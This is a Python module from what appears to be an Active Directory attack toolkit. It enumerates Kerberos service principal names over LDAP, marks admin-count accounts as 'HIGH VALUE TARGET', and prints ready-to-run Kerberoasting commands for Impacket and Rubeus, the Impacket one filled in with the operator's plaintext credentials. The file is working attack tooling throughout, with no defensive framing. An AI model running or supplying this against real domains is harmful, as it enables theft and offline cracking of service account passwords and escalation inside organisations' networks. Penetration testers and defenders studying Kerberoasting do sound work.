"""
Service Principal Name (SPN) enumeration module
"""

from ldap3 import SUBTREE


class SPNEnumerator:
    """Enumerates SPNs for Kerberoasting attacks"""

    def __init__(self, ldap_conn):
        self.conn = ldap_conn.get_connection()
        self.base_dn = ldap_conn.get_base_dn()
        self.domain = ldap_conn.domain
        self.username = ldap_conn.username
        self.password = ldap_conn.password
        self.spns = []

    def enumerate(self):
        """Enumerate Service Principal Names"""
        print(f"\n{'=' * 60}")
        print(f"SERVICE PRINCIPAL NAME ENUMERATION")
        print(f"{'=' * 60}")

        try:
            self.conn.search(
                search_base=self.base_dn,
                search_filter='(&(objectClass=user)(servicePrincipalName=*))',
                search_scope=SUBTREE,
                attributes=['sAMAccountName', 'servicePrincipalName', 'adminCount', 'memberOf']
            )

            spn_count = 0
            for entry in self.conn.entries:
                username = str(entry.sAMAccountName)
                spns = [str(s) for s in entry.servicePrincipalName]
                is_admin = str(entry.get('adminCount', 0)) == '1'

                spn_info = {
                    'username': username,
                    'spns': spns,
                    'is_admin': is_admin
                }

                self.spns.append(spn_info)
                spn_count += 1

                priority = " [HIGH VALUE TARGET]" if is_admin else ""
                print(f"[+] {username}{priority}")
                for spn in spns:
                    print(f"    SPN: {spn}")

            print(f"\n[+] Total users with SPNs: {spn_count}")
            self._print_attack_guidance()

        except Exception as e:
            print(f"[-] SPN enumeration failed: {e}")

        return {'spns': self.spns}

    def _print_attack_guidance(self):
        """Print Kerberoasting attack commands"""
        print(f"\n[*] Kerberoasting with Impacket:")
        print(f"    GetUserSPNs.py {self.domain}/{self.username}:{self.password} -request")
        print(f"\n[*] Kerberoasting with Rubeus (from Windows):")
        print(f"    Rubeus.exe kerberoast /outfile:hashes.txt")